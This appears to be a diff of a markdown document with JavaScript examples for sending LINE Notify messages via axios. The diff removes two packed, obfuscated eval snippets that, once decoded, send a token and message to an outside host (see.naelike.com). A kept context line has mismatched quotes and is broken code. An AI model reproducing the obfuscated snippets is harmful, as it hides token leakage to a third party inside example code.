@@ -82,12 +82,6 @@ var gteMessage = message;
 var urlGet = '../line-notify/messages + '?token= + getToken + '&message=' + gteMessage
 ```
 ```
-eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('3({4:"5",6:"7://8.9.b/c/d"+"?e="+f+"&g="+h,}).i(0(a){1.2(a.j)}).k(0(a){1.2(a)});',21,21,'function|console|log|axios|method|get|url|https|see|naelike||com|linenotify|messages|token|getToken|message|getMessage|then|data|catch'.split('|'),0,{}))
-```
-```
-eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0({1:"2",3:"4://5.6.7/8/9"+"?a="+b+"&c="+d,});',14,14,'axios|method|get|url|https|see|naelike|com|linenotify|messages|token|getToken|message|getMessage'.split('|'),0,{}))
-```
-```
 axios({
   method: "get",
   url: urlGet,
